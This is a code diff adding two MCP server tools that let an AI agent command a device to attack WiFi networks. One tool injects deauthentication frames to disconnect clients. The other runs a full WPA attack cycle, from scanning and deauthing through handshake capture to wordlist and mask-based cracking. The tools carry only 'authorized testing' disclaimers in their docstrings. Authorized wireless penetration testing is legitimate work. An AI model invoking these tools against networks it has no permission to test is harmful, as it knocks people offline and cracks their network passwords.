@@ -549,6 +549,52 @@ def device_crack_handshake(remote_pcap: str, wordlist: str = "", ssid: str = "")
 
 
 @mcp.tool()
+def device_deauth(bssid: str, sta: str = "broadcast", ch: int = 0, count: int = 16) -> str:
+    """Inject WiFi deauthentication frames at an AP to knock client(s) off (forces
+    a re-auth → fresh 4-way handshake). bssid: AP MAC. sta: a client MAC or
+    'broadcast'. ch: channel to send on. count: frames.
+
+    LEGAL: only against networks you own / are authorized to test."""
+    with _lock:
+        try:
+            _ensure()
+            r = _dev.deauth(bssid, sta, ch, count)
+            return _fmt(r)
+        except Exception as e:  # noqa: BLE001
+            return f"error: {e}"
+
+
+@mcp.tool()
+def device_wifi_attack(ssid: str = "", bssid: str = "", ch: int = 0, wordlist: str = "",
+                       mask: str = "", brute_limit: int = 0, capture_secs: float = 20.0,
+                       deauth_count: int = 16, rounds: int = 3) -> str:
+    """Full WPA attack cycle on the device: find AP → deauth → capture handshake →
+    fetch → crack by wordlist → optional brute by mask.
+
+    Give ssid (auto-scans for bssid+channel) or bssid+ch directly. wordlist: a
+    path / bare name under dictionaries/wordlists/ / '' for common.txt. mask: a
+    hashcat-style brute mask (e.g. '?d?d?d?d?d?d?d?d' = 8 digits); brute_limit
+    caps candidates (pure-Python PBKDF2 is slow). capture_secs/deauth_count/rounds
+    tune the capture.
+
+    LEGAL: authorized testing only — deauth is an active attack."""
+    with _lock:
+        try:
+            _ensure()
+            import wifi_attack, tempfile
+            wl = _resolve_wordlist(wordlist) if (wordlist or not mask) else ""
+            logs = []
+            out = wifi_attack.run_attack(
+                _dev, ssid=ssid, bssid=bssid, ch=ch, wordlist=wl, mask=mask,
+                brute_limit=brute_limit, capture_secs=capture_secs,
+                deauth_count=deauth_count, rounds=rounds,
+                local_dir=tempfile.gettempdir(), log=logs.append)
+            return "\n".join(logs) + "\n\n" + wifi_attack.format_result(out)
+        except Exception as e:  # noqa: BLE001
+            return f"error: {e}"
+
+
+@mcp.tool()
 def device_disconnect() -> str:
     """Close the transport to the device."""
     global _dev
